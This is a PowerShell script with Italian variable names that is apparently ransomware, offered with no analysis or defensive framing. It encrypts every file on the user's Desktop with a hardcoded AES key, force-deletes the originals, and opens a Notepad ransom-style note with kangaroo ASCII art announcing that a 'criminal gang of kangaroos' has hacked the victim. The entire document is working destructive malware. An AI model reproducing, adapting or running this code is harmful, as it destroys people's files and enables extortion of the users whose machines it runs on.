﻿$chiave = [System.Text.Encoding]::UTF8.GetBytes("prova12345678901")

$directory = "$env:USERPROFILE\Desktop"

$estensione = ".prova"


function Cripta-File {
    param ([string]$filePath,[byte[]]$key)

    $content = Get-Content -Path $filePath -Raw
    $aes = New-Object Security.Cryptography.AesManaged
    $aes.Key = $key
    $aes.IV = $key

    $encryptor = $aes.CreateEncryptor()
    $encryptedContent = [Convert]::ToBase64String($encryptor.TransformFinalBlock([System.Text.Encoding]::UTF8.GetBytes($content), 0, $content.Length))

    Set-Content -Path "$filePath$estensione" -Value $encryptedContent
}

function Rimuovi-File {
    param ([string]$directory)

    
    $files = Get-ChildItem -Path $directory

    
    foreach ($file in $files) {
        if ($file.Extension -ne ".prova") {
            Remove-Item -Path $file.FullName -Force
        }
    }
}


function Apri-Note {
    $percorsoFile = "$env:USERPROFILE\Desktop\note.txt"

    if (-not (Test-Path $percorsoFile)) {
        New-Item -Path $percorsoFile -ItemType File | Out-Null
    }

    $asciiCanguro = @"
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣤⣤⣤⣀⠀⠀⠀⠀⠀⠀⠘⣿⣦⣤⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣷⣦⣀⠀⠀⠀⣰⣿⣿⣿⣷⡄
⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣾⣿⣿⠛⠛⠛⠛
⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⠏⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣼⣿⣿⠇⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣻⣿⠟⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣸⣿⣿⠏⠀⠀⠀⢸⣿⣿⣿⣿⠿⠿⠛⢁⣿⡏⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢰⣿⣿⡏⠀⠀⠀⠀⢿⣿⣿⠿⠋⠀⠀⠀⠀⠾⠛⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⣿⣿⠏⠀⠀⠀⠀⢸⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠐⢦⣤⣴⣿⡿⠋⠀⠀⠀⢠⣾⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠉⠉⠁⠀⠀⠀⠀⠀⣸⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠐⠿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"@

    Add-Content -Path $percorsoFile -Value $asciiCanguro -Encoding UTF8
    Start-Sleep -Seconds 1
    Add-Content -Path $percorsoFile -Value "CIAO CARO" -Force
    Add-Content -Path $percorsoFile -Value "SEI STATO HACKERATO DALLA GANG CRIMINALE DEI CANGURI" -Force
    Add-Content -Path $percorsoFile -Value "MA TU SEI PIU' CANGURO DI NOI .... PROVA A CONTROLLARE I FILE SUL DESKTOP" -Force

    Start-Process notepad.exe -ArgumentList $percorsoFile
}


$files = Get-ChildItem -Path $directory

foreach ($file in $files) {
    Cripta-File -filePath $file.FullName -key $chiave
}


Rimuovi-File -directory $directory

Apri-Note